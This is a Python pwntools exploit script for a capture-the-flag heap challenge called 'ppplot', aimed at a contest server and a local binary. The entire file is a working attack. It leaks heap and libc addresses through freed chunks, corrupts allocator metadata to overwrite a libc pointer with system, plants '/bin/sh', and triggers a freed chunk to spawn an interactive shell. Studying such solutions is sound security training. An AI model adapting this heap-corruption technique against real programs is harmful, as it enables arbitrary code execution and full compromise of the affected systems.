#!/usr/bin/python3

from pwn import *

exe = ELF("ppplot_patched", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""


                c
                """,
        )
        input()


rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("chall.lac.tf", 31164)
else:
    p = process(exe.path)

GDB()

def create(size, payload):
    sla(b"pp: ", "1")
    sla(b"degree: ", str(size).encode())
    payload = payload.ljust(size * 4, b"0")
    for i in range(0, size * 4, 4):
        sla(b": ", payload[i : i + 4])


#     if payload.length()//4 < size:
#     for i in range(size - payload)


def delete(idx):
    sla(b"pp: ", "5")
    sla(b": ", str(idx).encode())


def leak(idx):
    sla(b"pp: ", "3")
    sla(b": ", str(idx).encode())


def leakk(tmp1, tmp2):


    tmp1 = int(tmp1[1][:-1].decode())
    tmp2 = int(tmp2[1][:-1].decode()) - tmp1

    tmp1 = format(tmp1 & 0xFFFFFFFF, "x")
    tmp2 = format(tmp2 & 0xFFFFFFFF, "x")
    return int("0x" + tmp2 + tmp1, 16)


def pa(tmp):
    tmp = str(tmp)
    for i in range(4 - len(tmp)):
        tmp = "0" + tmp
    return tmp.encode()


create(1, p32(1))  # 0
create(1, p32(1))
create(1, p32(1))
delete(0)
delete(1)
delete(2)
create(2, p32(1))  # 3
delete(1)
leak(3)
p.recvlines(32)
tmp1 = p.recvline().split()
tmp2 = p.recvline().split()
heap = leakk(tmp1, tmp2) - 0x2A0
info("heap: " + hex(heap))
#######
create(5, pa(0)*2 + pa(0x501))  # target

for i in range(15):
    create(1, pa(1337))
create(7, pa(1337))
create(2, pa(0x501) +pa(0))
######
for i in range(9):
    create(1, pa(1337))
for i in range(20, 29):
    delete(i)
delete(27)
create(1, pa(1337)) #32
create(1, pa(1337))
create(1, pa(1337))
target = (0x2b0 + heap) & 0xFFFFFFFF
sla(b"pp: ", "1")
sla(b"degree: ", str(1).encode())
sla(b": ", str(target))
create(1, pa(1337)) 
create(1, pa(1337)) #36
delete(36)
leak(1)
p.recvlines(33)
tmp1 = p.recvline().split()
####
target = (0x2b0 + heap+4) 

sla(b"pp: ", "1")
sla(b"degree: ", str(8).encode())
sla(b": ", str(0))
sla(b": ", str(0))
sla(b": ", str(0x21))
sla(b": ", str(0))
sla(b": ", str(1))
sla(b": ", str(0))
sla(b": ", str(target& 0xFFFFFFFF).encode())
sla(b": ", str((target>>32)).encode())
leak(1)
p.recvlines(33)
tmp2 = p.recvline().split()
tmp1 = int(tmp1[1][:-1].decode())
tmp2 = int(tmp2[1][:-1].decode())
tmp1 = format(tmp1 & 0xFFFFFFFF, "x")
tmp2 = format(tmp2 & 0xFFFFFFFF, "x")
libc.address =  int("0x" + tmp2 + tmp1, 16) - 0x1ed0e1
info("libc.address: " + hex(libc.address)) 

####
binsh = u64(b'/bin/sh\0')
sla(b"pp: ", "1")
sla(b"degree: ", str(2).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str((binsh>>32)).encode())
###


delete(20)
delete(6)
delete(21)
delete(22)
delete(23)
binsh = u64(b'/bin/sh\0')
sla(b"pp: ", "1")
sla(b"degree: ", str(7).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str((binsh>>32)).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str(binsh & 0xffffffff).encode())

binsh = u64(b'/bin/sh\0')
sla(b"pp: ", "1")
sla(b"degree: ", str(7).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str((binsh>>32)).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
binsh = libc.address + 0x1eee48
sla(b"pp: ", "1")
sla(b"degree: ", str(7).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str((binsh>>32)).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str(binsh & 0xffffffff).encode())

binsh = libc.sym.system
sla(b"pp: ", "1")
sla(b"degree: ", str(2).encode())
sla(b": ", str(binsh & 0xffffffff).encode())
sla(b": ", str((binsh>>32)).encode())

delete(2)
p.interactive()
